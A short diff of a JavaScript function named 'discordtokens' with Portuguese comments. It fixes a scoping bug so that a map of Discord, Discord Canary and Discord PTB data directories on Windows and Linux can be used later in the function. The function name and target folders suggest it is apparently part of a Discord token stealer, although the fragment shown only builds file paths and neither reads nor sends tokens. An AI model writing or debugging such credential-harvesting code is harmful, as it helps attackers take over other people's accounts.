@@ -7,15 +7,17 @@ async function discordtokens() {
   const local = process.env.LOCALAPPDATA || process.env.HOME || ''
   const roaming = process.env.APPDATA || process.env.HOME || ''
 
+  let caminhos = {}
+
   if (!local || !roaming) {
     console.log('Variáveis de ambiente LOCALAPPDATA/APPDATA não encontradas. Executando apenas para Discord...')
-    const caminhos = {
+    caminhos = {
       discord: path.join(process.env.HOME || '', '.config', 'discord'),
       discord_canary: path.join(process.env.HOME || '', '.config', 'discordcanary'),
       discord_ptb: path.join(process.env.HOME || '', '.config', 'discordptb')
     }
   } else {
-    const caminhos = {
+    caminhos = {
       discord: path.join(roaming, 'Discord'),
       discord_canary: path.join(roaming, 'discordcanary'),
       discord_ptb: path.join(roaming, 'discordptb'),
